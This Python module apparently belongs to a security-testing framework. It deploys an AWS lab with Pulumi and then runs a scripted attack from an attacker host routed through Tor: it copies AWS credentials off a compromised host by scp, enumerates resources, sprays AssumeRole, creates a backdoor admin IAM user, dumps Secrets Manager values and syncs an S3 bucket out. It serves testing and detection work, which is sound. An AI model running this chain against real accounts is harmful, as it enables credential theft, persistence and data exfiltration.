import os
import string
import random
import shlex
import sys
import re
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored

from core.helpers import (
    loading_animation,
    generate_ssh_key,
    upload_file_to_server,
    run_subprocess,
)

from .consts import *

CONNECTIVITY_CHECK_INTERVAL = 60  # In seconds
MAX_CONNECTIVITY_WAIT_TIME = 60 * 10


class ScenarioExecution:
    def __init__(self):
        self.agent_included = None
        self.compromised_ec2_external_ip = None
        self.attacker_ec2_external_ip = None
        self.lambda_role_arn = None
        self.exfil_bucket_name = None
        self.compromised_ec2_key = "./compromised_id_rsa"
        self.compromised_ec2_public_key = "./compromised_id_rsa.pub"
        self.attacker_ec2_key = "./attacker_id_rsa"
        self.backdoor_username = DEFAULT_BACKDOOR_USERNAME
        self.attacker_env_vars = {}

        self.discovered_roles = []
        self.discovered_buckets = []
        self.discovered_secrets = []

        self.accessible_roles = []

    def read_pulumi_config(self):
        with open(PULUMI_OUTPUT_JSON_PATH, "r") as file:
            data = json.load(file)

        self.agent_included = data["Agent Included"]
        self.attacker_ec2_external_ip = data["Attacker Server Public IP"]
        self.lambda_role_arn = data["Lambda Role ARN"]
        self.iam_monitor_role_arn = data["IAM Monitor Role ARN"]
        self.exfil_bucket_name = data["Bucket Name"]

        if self.agent_included:
            self.compromised_ec2_external_ip = data["Compromised Server Public IP"]
        else:
            self.attacker_env_vars["AWS_ACCESS_KEY_ID"] = data["Dev Access Key ID"]
            self.attacker_env_vars["AWS_SECRET_ACCESS_KEY"] = data[
                "Dev Access Key Secret"
            ]
            self.attacker_env_vars["AWS_REGION"] = data["Region"]

    def init_infra(self):
        if not os.path.exists(self.compromised_ec2_key):
            generate_ssh_key(self.compromised_ec2_key)
        if not os.path.exists(self.attacker_ec2_key):
            generate_ssh_key(self.attacker_ec2_key)

        run_subprocess(
            f"cd ./scenarios/scenario_8/infra/ && pulumi up -s {PULUMI_STACK_NAME} -y"
        )
        run_subprocess(
            f"cd ./scenarios/scenario_8/infra/ && pulumi stack -s {PULUMI_STACK_NAME} output --json --show-secrets > ../../../{PULUMI_OUTPUT_JSON_PATH}"
        )

    def check_agent_connected(self):
        cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo {CYTOOL_STATUS_CMD}"'
        output = run_subprocess(cmdline, return_output=True, check=False)
        edr_state = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
        if edr_state:
            edr_state = edr_state.group(1)

        return edr_state == "Enabled"

    def get_compromised_server_sshd_public_key(self):
        # This is not the key we generated to access the compromised machine, but the key used to verify its identity
        # Although in this scenario host verification is not done in general, we still want to do it when connecting through Tor
        cmdline = f"ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} cat /etc/ssh/ssh_host_rsa_key.pub"
        output = run_subprocess(cmdline, return_output=True)

        return output

    def wait_for_agent(self):
        agent_connected = self.check_agent_connected()
        time_waited = 0
        while not agent_connected:
            if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
                print(
                    colored(
                        f"Agent did not connect for too long (timed out), aborting...",
                        color="red",
                    )
                )
                exit(1)

            time.sleep(CONNECTIVITY_CHECK_INTERVAL)
            time_waited += CONNECTIVITY_CHECK_INTERVAL
            agent_connected = self.check_agent_connected()

        print(colored("Agent connected!", color="green"))

    def attacker_run(self, cmdline, return_errcode=False, check=False, use_tor=True):
        # Build the export string from the class state
        env_prefix = ""
        if self.attacker_env_vars:
            # Creates: "export KEY='VAL'; export KEY2='VAL2'; "
            env_prefix = (
                " ".join(
                    [f"export {k}='{v}';" for k, v in self.attacker_env_vars.items()]
                )
                + " "
            )

        # Prepend it to the user's command
        if use_tor:
            full_remote_cmd = f"{env_prefix} proxychains4 -q {cmdline}"
        else:
            full_remote_cmd = f"{env_prefix}{cmdline}"

        escaped_cmd = shlex.quote(full_remote_cmd)

        # Construct the SSH wrapper
        nested_cmdline = f"ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} {escaped_cmd} 2>&1"

        return_output = not return_errcode

        result = run_subprocess(
            nested_cmdline, return_output=return_output, check=check
        )

        # Sometimes connection is unstable and needs retries
        while return_output and (
            result.find("Connection reset by peer") != -1
            or result.find("Network is down") != -1
        ):
            print("Connection lost, retrying...")
            sleep(CONNECTIVITY_CHECK_INTERVAL)
            result = run_subprocess(
                nested_cmdline, return_output=return_output, check=check
            )

        return result

    def wait_for_attacker(self):
        tor_status_cmdline = "cat /home/ubuntu/tor_status.txt | grep successful"

        tor_connected = (
            self.attacker_run(tor_status_cmdline, return_errcode=True, use_tor=False)
            == 0
        )
        time_waited = 0
        while not tor_connected:
            if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
                print(
                    colored(
                        f"Attacker machine did not initialize for too long (timed out), aborting...",
                        color="red",
                    )
                )
                exit(1)
            sleep(CONNECTIVITY_CHECK_INTERVAL)
            time_waited += CONNECTIVITY_CHECK_INTERVAL
            tor_connected = (
                self.attacker_run(
                    tor_status_cmdline, return_errcode=True, use_tor=False
                )
                == 0
            )

    def attempt_recon(self):
        # List buckets
        result = self.attacker_run('aws s3api list-buckets | jq ".Buckets[].Name"')

        # If configuration related errors are seen, abort
        if result.find(" by running ") != -1:
            raise (
                "AWS Configuration error on attacker's machine, likely missing credentials"
            )

        if result.find("AccessDenied") == -1:
            self.discovered_buckets = [name.strip('"') for name in result.split()]
            print(
                colored(
                    f"Buckets enumeration attempt discovered {len(self.discovered_buckets)} buckets",
                    "red",
                )
            )
        else:
            print(colored("Buckets enumeration attempt failed", "red"))

        # List secrets
        result = self.attacker_run(
            'aws secretsmanager list-secrets | jq ".SecretList[].Name"'
        )

        if result.find("AccessDenied") == -1:
            self.discovered_secrets = [name.strip('"') for name in result.split()]
            print(
                colored(
                    f"Secrets enumeration attempt discovered {len(self.discovered_secrets)} secrets",
                    "red",
                )
            )
        else:
            print(colored("Secrets enumeration attempt failed", "red"))

        # List roles
        result = self.attacker_run('aws iam list-roles | jq ".Roles[].Arn"')
        if result.find("AccessDenied") == -1:
            self.discovered_roles = [arn.strip('"') for arn in result.split()]
            print(
                colored(
                    f"IAM roles enumeration attempt discovered {len(self.discovered_roles)} roles",
                    "red",
                )
            )
        else:
            print(colored("IAM roles enumeration attempt failed", "red"))

    def secrets_dump(self):
        for secret_name in self.discovered_secrets:
            cmdline = f'aws secretsmanager get-secret-value --secret-id "{secret_name}"'
            res = self.attacker_run(cmdline)
            print(res)

    def attacker_assume_role(
        self, role_arn, session_name="DebuggingSession", update_env=True, check=True
    ):
        cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --output json 2>&1"

        output = self.attacker_run(cmd)

        if output.find("AccessDenied") != -1:
            # Ensure success if flag requires it
            if check:
                print(colored(f"Failed to assume-role", "red"))
                raise Exception(
                    "Mandatory AssumeRole failed due to lack of permissions"
                )

            return False

        else:
            try:
                credentials = json.loads(output)["Credentials"]

                # Update the class state
                if update_env:
                    self.attacker_env_vars["AWS_ACCESS_KEY_ID"] = credentials[
                        "AccessKeyId"
                    ]
                    self.attacker_env_vars["AWS_SECRET_ACCESS_KEY"] = credentials[
                        "SecretAccessKey"
                    ]
                    self.attacker_env_vars["AWS_SESSION_TOKEN"] = credentials[
                        "SessionToken"
                    ]
                    print(colored("Environment updated.", "red"))

                print(colored(f"Successfully assumed role!", "red"))
                return True

            except (json.JSONDecodeError, KeyError) as e:
                print(colored(f"Failed to assume-role, unexpected output", "red"))
                print(output)
                raise e

    def attempt_backdoor(self):
        # Create new user
        result = self.attacker_run(
            f"aws iam create-user --user-name {self.backdoor_username} --tags Key=UC-OWNER,Value=Attacker"
        )
        if result.find("AccessDenied") != -1:
            print(colored("Failed to create new IAM user", "red"))
            return False

        # Attach admin policy
        result = self.attacker_run(
            f"aws iam attach-user-policy --user-name {self.backdoor_username} --policy-arn {BACKDOOR_ADMIN_POLICY_ARN}"
        )
        if result.find("AccessDenied") != -1:
            print(colored("Failed to attach admin policy to new IAM user", "red"))
            return False

        # Create password for user
        password_charset = string.ascii_letters + string.digits
        generated_password = "".join(random.choices(password_charset, k=12))
        print(
            colored(
                f"Generated password for backdoor user {self.backdoor_username}:{generated_password}",
                "red",
            )
        )

        result = self.attacker_run(
            f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}"
        )
        if result.find("AccessDenied") != -1:
            print(colored("Failed to create login profile for new IAM user", "red"))
            return False

        print(colored("Backdoor user created successfully!", "red"))
        return True

    def s3_exfiltration(self):
        s3_cmd = f"aws s3 sync s3://{self.exfil_bucket_name} /home/ubuntu/stolen_data/"
        res = self.attacker_run(s3_cmd)
        print(res)

    def scenario_8_execute(self, manual):
        # Init
        print("-" * 30)
        print(
            colored(
                "Executing Scenraio 8 : AWS Persistence Privileges Escalation",
                color="red",
            )
        )
        print("-" * 30)

        print(
            colored(
                "Please make sure that this scenario's Pulumi.yaml is properly configured for your specific environment.",
                color="red",
            )
        )

        input("Press enter to continue...")

        print(colored("Rolling out Infra", color="red"))
        print("-" * 30)

        self.init_infra()
        print(colored("Infra deployed!", color="red"))

        if manual:
            print(
                colored(
                    "Using manual mode, use 'post-launch' in order to start the attack simulation",
                    color="yellow",
                )
            )

        else:
            self.post_execution()

    def post_execution(self):
        print(colored("Starting attack simulation...", "red"))
        self.read_pulumi_config()

        print(colored("Waiting for attacker's machine to initialize...", color="red"))
        loading_animation()

        self.wait_for_attacker()

        if self.agent_included:
            print(
                colored(
                    "Waiting for compromised machine with agent to initialize...",
                    color="red",
                )
            )
            loading_animation()
            self.wait_for_agent()

            # Upload compromised SSH key to attacker's machine - Scenario with agent begins with the attackers having their hands on this SSH key
            print(
                colored(
                    "Uploading compromised machine SSH key onto attacker's machine",
                    color="red",
                )
            )
            upload_file_to_server(
                self.compromised_ec2_key,
                "ubuntu",
                self.attacker_ec2_external_ip,
                "/home/ubuntu/",
                key_path="./attacker_id_rsa",
            )

            # Add compromised server identity to known hosts of attacker's machine for verification
            print(
                colored(
                    "Adding public key of compromised machine to known hosts",
                    color="red",
                )
            )

            compromised_sshd_public_key = self.get_compromised_server_sshd_public_key()
            self.attacker_run(
                f"echo {self.compromised_ec2_external_ip} {compromised_sshd_public_key} >> ~/.ssh/known_hosts",
                check=True,
                use_tor=False,
            )

            # Local AWS CLI credentials are exfilterated onto attacker's machine
            print(
                colored(
                    "Exfiltrating AWS credentials from compromised machine onto attacker's machine",
                    color="red",
                )
            )
            self.attacker_run("mkdir ~/.aws")

            self.attacker_run(
                f"scp -i {os.path.basename(self.compromised_ec2_key)} ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials",
                check=True,
            )
            self.attacker_run(
                f"scp -i {os.path.basename(self.compromised_ec2_key)} ubuntu@{self.compromised_ec2_external_ip}:~/.aws/config ./.aws/config",
                check=True,
            )

        else:
            print(
                colored(
                    "Agent not included in the scenario, procceeding...", color="yellow"
                )
            )
            # Without agent the scenario begins with the attackers using the compromised dev user AWS CLI credentials

        # Recon attempts will fail since initial compromised user has low privileges
        print(
            colored(
                "Attempting recon & backdoor user creation, other than roles discovery this should fail due to lack of permissions",
                "red",
            )
        )
        self.attempt_recon()
        self.attempt_backdoor()

        # Assume lambda role
        print(colored(f"Attempting to assume lambda role...", "yellow"))
        self.attacker_assume_role(self.lambda_role_arn)

        # Will fail since privileges are still not sufficient
        print(
            colored(
                "Attempting backdoor user creation again, this should still fail due to lack of permissions",
                "red",
            )
        )
        self.attempt_backdoor()

        # AssumeRole spray
        if self.discovered_roles:
            print(
                colored(
                    f"Spraying AssumeRole on {len(self.discovered_roles)} discovered roles...",
                    "red",
                )
            )

            for role_arn in tqdm(self.discovered_roles):
                if self.attacker_assume_role(role_arn, update_env=False, check=False):
                    self.accessible_roles.append(role_arn)

        if self.iam_monitor_role_arn not in self.accessible_roles:
            print(
                colored(
                    "Could not assume IAM Monitor role which is mandatory for the rest of the scenario, exiting...",
                    "red",
                )
            )
            exit(1)

        # Use higher privileges discovered role
        print(colored(f"Attempting to assume IAM monitor role...", "yellow"))
        self.attacker_assume_role(self.iam_monitor_role_arn)
        if not self.attempt_backdoor():
            print(
                colored(
                    "Could not create backdoor user with privileged role, aborting...",
                    "red",
                )
            )
            exit(1)

        self.attempt_recon()

        # Secrets dump
        print(colored("Dumping secrets...", "red"))
        if not self.discovered_secrets:
            print(
                colored("Couldn't find secrets on recon attempts, aborting...", "red")
            )
            exit(1)

        self.secrets_dump()

        # Exfiltration from S3
        if self.exfil_bucket_name not in self.discovered_buckets:
            print(
                colored(
                    "Scenario bucket for exfiltration was not found in discovered buckets, aborting...",
                    "red",
                )
            )
            exit(1)

        print(colored("Exfiltrating S3 data...", "red"))
        self.s3_exfiltration()

    def scenario_8_destroy(self):
        print(colored("Removing backdoor user...", "red"))
        run_subprocess(
            f"aws iam delete-login-profile --user-name {self.backdoor_username}",
            check=False,
        )
        run_subprocess(
            f"aws iam detach-user-policy --user-name {self.backdoor_username} --policy-arn {BACKDOOR_ADMIN_POLICY_ARN}",
            check=False,
        )
        run_subprocess(
            f"aws iam delete-user --user-name {self.backdoor_username}", check=False
        )

        print(colored("Destroying infra...", "red"))
        run_subprocess(
            f"cd ./scenarios/scenario_8/infra && pulumi destroy -s {PULUMI_STACK_NAME} --yes"
        )
